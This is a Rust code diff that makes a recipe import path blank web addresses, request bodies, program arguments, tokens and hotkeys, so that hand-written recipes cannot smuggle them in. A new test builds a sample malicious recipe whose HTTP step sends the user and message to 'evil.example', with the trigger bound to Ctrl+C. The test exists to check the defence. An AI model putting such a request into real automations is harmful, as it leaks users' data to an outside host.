@@ -9,6 +9,9 @@
 //! - Everything imported arrives switched off.
 //! - Steps that run programs or write files are flagged, and the import
 //!   needs an explicit yes for them.
+//!
+//! Import cleans exactly what export does, so a recipe written by hand
+//! can't bring in a web address, a program or a hotkey the user never set.
 
 use super::model::{visit_steps, Integration, StepKind, Trigger};
 use crate::json::{self, Value};
@@ -45,17 +48,7 @@ pub fn export(name: &str, integrations: &[Integration]) -> String {
         .iter()
         .map(|i| {
             let mut i = i.clone();
-            for h in &mut i.handlers {
-                strip_private(&mut h.steps);
-                match &mut h.trigger {
-                    Trigger::Webhook { token } => token.clear(),
-                    Trigger::Shortcut { hotkey, midi } => {
-                        hotkey.clear();
-                        midi.clear();
-                    }
-                    _ => {}
-                }
-            }
+            make_private(&mut i);
             i.to_json()
         })
         .collect();
@@ -66,9 +59,25 @@ pub fn export(name: &str, integrations: &[Integration]) -> String {
     format!("{PREFIX}{}", base64url_encode(doc.to_json().as_bytes()))
 }
 
-/// Blank whatever a recipe must never carry: the Discord connection,
-/// web addresses and headers (they hold API keys and webhook secrets), and
-/// file and program paths (they name the user's folders).
+/// Blank whatever a recipe must never carry: see `strip_private`, plus web
+/// call tokens and the hotkey or pad an integration starts from.
+fn make_private(i: &mut Integration) {
+    for h in &mut i.handlers {
+        strip_private(&mut h.steps);
+        match &mut h.trigger {
+            Trigger::Webhook { token } => token.clear(),
+            Trigger::Shortcut { hotkey, midi } => {
+                hotkey.clear();
+                midi.clear();
+            }
+            _ => {}
+        }
+    }
+}
+
+/// The Discord connection, web requests (address, headers and body hold
+/// API keys and webhook secrets), and programs and files (their paths and
+/// arguments name the user's folders and carry tokens).
 fn strip_private(steps: &mut [super::model::Step]) {
     for s in steps {
         match s.kind {
@@ -79,8 +88,13 @@ fn strip_private(steps: &mut [super::model::Step]) {
             StepKind::Http => {
                 s.params.insert("url".into(), String::new());
                 s.params.remove("headers");
+                s.params.remove("body");
             }
-            StepKind::Program | StepKind::File => {
+            StepKind::Program => {
+                s.params.insert("path".into(), String::new());
+                s.params.remove("args");
+            }
+            StepKind::File => {
                 s.params.insert("path".into(), String::new());
             }
             _ => {}
@@ -120,6 +134,7 @@ pub fn parse(text: &str, mut new_id: impl FnMut() -> String) -> Result<Recipe, S
                 "the recipe has something unsafe or broken: {problem}"
             ));
         }
+        make_private(&mut i);
         i.id = new_id();
         i.enabled = false;
         for h in &mut i.handlers {
@@ -286,6 +301,31 @@ mod tests {
             parse(&text, || "fresh1234567890ab".into()).is_ok(),
             "still imports, unfinished"
         );
+    }
+
+    #[test]
+    fn a_hand_written_recipe_is_cleaned_on_import() {
+        use super::super::model::Step;
+        let mut i = presets::build("delay_command", "x".into(), "").unwrap();
+        i.handlers[0].trigger = Trigger::Shortcut {
+            hotkey: "Ctrl+C".into(),
+            midi: String::new(),
+        };
+        i.handlers[0].steps = vec![Step::new(
+            StepKind::Http,
+            &[
+                ("url", "https://evil.example/?u={user}"),
+                ("body", "{message}"),
+            ],
+        )];
+        // Encoded by hand, skipping the cleaning `export` does.
+        let doc = json::obj([("integrations", Value::Arr(vec![i.to_json()]))]);
+        let text = format!("{PREFIX}{}", base64url_encode(doc.to_json().as_bytes()));
+        let recipe = parse(&text, || "fresh1234567890ab".into()).unwrap();
+        let h = &recipe.integrations[0].handlers[0];
+        assert_eq!(h.steps[0].param("url"), "");
+        assert_eq!(h.steps[0].param("body"), "");
+        assert!(matches!(&h.trigger, Trigger::Shortcut { hotkey, .. } if hotkey.is_empty()));
     }
 
     #[test]
